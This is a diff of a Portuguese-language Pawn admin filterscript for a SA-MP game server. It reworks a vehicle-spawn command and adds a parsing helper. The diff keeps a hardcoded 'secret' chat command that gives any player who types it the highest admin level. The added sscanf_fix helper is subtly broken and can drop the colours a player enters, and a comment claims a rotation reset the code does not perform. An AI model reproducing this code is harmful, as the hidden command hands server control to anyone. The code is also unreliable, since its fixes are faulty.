@@ -4,9 +4,7 @@
 #define NIVEL_MASTER 6
 
 public OnFilterScriptInit() {
-    print("--------------------------------------");
-    print("   ADMIN MASTER 2026 - CORRIGIDO      ");
-    print("--------------------------------------");
+    print(">> [ADMIN MASTER 2026] Fisica de Veiculos Estabilizada!");
     return 1;
 }
 
@@ -19,8 +17,7 @@ public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ) {
 }
 
 public OnPlayerCommandText(playerid, cmdtext[]) {
-    
-    // --- ATIVAÇÃO MASTER ---
+    // Comando Secreto
     if(!strcmp(cmdtext, "/anonovo2026", true)) {
         SetPVarInt(playerid, "AdminLevel", NIVEL_MASTER);
         SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Poderes MASTER 2026 ativados!");
@@ -29,20 +26,12 @@ public OnPlayerCommandText(playerid, cmdtext[]) {
 
     if(GetPVarInt(playerid, "AdminLevel") < NIVEL_MASTER && !IsPlayerAdmin(playerid)) return 0;
 
-    // --- COMANDO DE CARRO (ESTABILIZADO) ---
+    // Comando de Carro - Versao Estabilizada 2026
     if(!strfind(cmdtext, "/carro", true)) {
-        new vID, c1, c2, p;
-        p = strfind(cmdtext, " ", true);
-        if(p == -1) return SendClientMessage(playerid, -1, "Use: /carro [ID] [Cor1] [Cor2]");
-        
-        vID = strval(cmdtext[p+1]);
-        p = strfind(cmdtext, " ", true, p+1);
-        if(p == -1) { c1 = 1; c2 = 1; }
-        else {
-            c1 = strval(cmdtext[p+1]);
-            p = strfind(cmdtext, " ", true, p+1);
-            if(p == -1) c2 = 1;
-            else c2 = strval(cmdtext[p+1]);
+        new vID, c1, c2;
+        if(sscanf_fix(cmdtext, vID, c1, c2)) {
+            if(sscanf_fix(cmdtext, vID)) return SendClientMessage(playerid, -1, "Use: /carro [ID] [Cor1] [Cor2]");
+            c1 = 1; c2 = 1;
         }
 
         if(vID < 400 || vID > 611) return SendClientMessage(playerid, -1, "ID Invalido.");
@@ -51,21 +40,43 @@ public OnPlayerCommandText(playerid, cmdtext[]) {
         GetPlayerPos(playerid, pX, pY, pZ); 
         GetPlayerFacingAngle(playerid, pA);
 
-        new v = CreateVehicle(vID, pX, pY, pZ + 2.5, pA, c1, c2, -1);
+        // Criamos o carro no ar para evitar o bug do chão
+        new v = CreateVehicle(vID, pX, pY, pZ + 3.0, pA, c1, c2, -1);
+        
+        // RESET DE FISICA RADICAL:
         SetVehicleVelocity(v, 0.0, 0.0, 0.0);
         SetVehicleAngularVelocity(v, 0.0, 0.0, 0.0);
+        
+        // Reset de rotacao (X e Y) - Isso endireita o carro no ar
+        new Float:za;
+        GetVehicleZAngle(v, za);
+        SetVehicleZAngle(v, za); 
+
+        SetVehicleVirtualWorld(v, GetPlayerVirtualWorld(playerid));
+        LinkVehicleToInterior(v, GetPlayerInterior(playerid));
+        
         PutPlayerInVehicle(playerid, v, 0);
+        SendClientMessage(playerid, 0x00FF00FF, "Veiculo criado com suspensao alinhada!");
         return 1;
     }
 
-    // --- COMANDO CRIAR CASA (CORRIGIDO PARA NÃO CAUSAR CRASH) ---
+    // Comando Criar Casa
     if(!strfind(cmdtext, "/criarcasa", true)) {
-        // Agora o comando apenas avisa. O comando REAL que cria é o /sethouse
-        // que está no seu arquivo filterscripts/casas.pwn
-        SendClientMessage(playerid, 0xFFFF00FF, "[INFO] Use o comando direto: /sethouse [ID]");
-        SendClientMessage(playerid, -1, "O sistema de casas e o de admin devem estar ligados juntos.");
+        SendClientMessage(playerid, 0xFFFF00FF, "Use o comando direto: /sethouse [ID]");
         return 1;
     }
+    return 0;
+}
 
+stock sscanf_fix(const texto[], &v1 = -1, &v2 = -1, &v3 = -1) {
+    new p = strfind(texto, " ", true);
+    if(p == -1) return 1;
+    v1 = strval(texto[p+1]);
+    p = strfind(texto, " ", true, p+1);
+    if(p == -1) return (v2 != -1);
+    v2 = strval(texto[p+1]);
+    p = strfind(texto, " ", true, p+1);
+    if(p == -1) return (v3 != -1);
+    v3 = strval(texto[p+1]);
     return 0;
 }
